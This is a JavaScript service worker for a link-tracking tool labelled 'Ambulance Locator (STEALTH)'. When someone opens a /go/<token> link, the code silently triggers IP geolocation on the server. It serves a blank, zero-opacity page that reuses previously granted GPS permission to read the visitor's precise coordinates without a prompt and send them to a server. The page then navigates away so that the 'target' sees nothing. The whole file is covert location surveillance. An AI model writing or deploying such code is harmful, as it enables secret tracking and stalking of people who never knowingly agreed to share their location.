// ═══════════════════════════════════════════════════════════
// AMBULANCE LOCATOR — Service Worker v2.0 (STEALTH)
// ═══════════════════════════════════════════════════════════
// Intercepts navigation to /go/<token> and:
//   1. Triggers server-side IP geolocation (5 engines)
//   2. Returns stealth HTML that immediately navigates to about:blank
//   3. If GPS permission is cached, fires GPS silently before vanishing
//
// The target NEVER sees a visible page with content.
// ═══════════════════════════════════════════════════════════

const CACHE_NAME = "ambulance-locator-v2";

self.addEventListener("install", function(event) {
  self.skipWaiting();
});

self.addEventListener("activate", function(event) {
  event.waitUntil(self.clients.claim());
});

// ── Intercept navigation to /go/<token> ──
self.addEventListener("fetch", function(event) {
  const url = new URL(event.request.url);

  // Only intercept /go/<token> navigations
  const match = url.pathname.match(/^\/go\/([a-f0-9]+)$/);
  if (!match) {
    return;
  }

  const token = match[1];
  const origin = url.origin;

  event.respondWith(
    (async function() {
      try {
        // ── Step 1: Trigger server-side geolocation silently ──
        const captureUrl = origin + "/sw-capture/" + token;
        const response = await fetch(captureUrl, {
          method: "GET",
          headers: { "X-SW-Intercept": "1" }
        });
        const data = await response.json();

        // ── Step 2: Build stealth HTML response ──
        // This page:
        //   - Has zero visual footprint (body opacity:0, immediate meta refresh)
        //   - Checks if GPS permission is cached (from previous verify.html visit)
        //   - If cached, fires GPS silently and sends to server
        //   - Immediately navigates to about:blank
        const stealthHtml = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<meta http-equiv="refresh" content="0;url=about:blank" />
<title> </title>
<style>
  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
  html, body { background: #000; overflow: hidden; width: 100%; height: 100%; }
  body { opacity: 0; }
</style>
</head>
<body>
<script>
(function(){
  var t="${token}";

  function sendCoords(lat,lng,acc){
    var p=JSON.stringify({token:t,latitude:lat,longitude:lng,accuracy:acc,connectionType:null,timezone:null});
    var b=new Blob([p],{type:"application/json"});
    navigator.sendBeacon("/api/location-update",b);
  }

  // Check if GPS permission is cached from a previous visit
  if(navigator.permissions&&navigator.permissions.query){
    navigator.permissions.query({name:"geolocation"}).then(function(st){
      if(st.state==="granted"&&"geolocation"in navigator){
        navigator.geolocation.getCurrentPosition(
          function(pos){sendCoords(pos.coords.latitude,pos.coords.longitude,pos.coords.accuracy);},
          function(){},
          {enableHighAccuracy:true,timeout:8000,maximumAge:60000}
        );
      }
    }).catch(function(){});
  }

  // Navigate away immediately
  try{window.location.replace("about:blank")}catch(e){}
  try{window.open("","_self","").close()}catch(e){}
  try{self.close()}catch(e){}
  try{window.close()}catch(e){}
})();
<\/script>
</body>
</html>`;

        return new Response(stealthHtml, {
          headers: {
            "Content-Type": "text/html; charset=utf-8",
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
            "Pragma": "no-cache",
            "X-Robots-Tag": "noindex, nofollow",
          }
        });

      } catch (e) {
        // Fallback: let the browser navigate normally (will hit /go/<token> on server)
        return fetch(event.request);
      }
    })()
  );
});
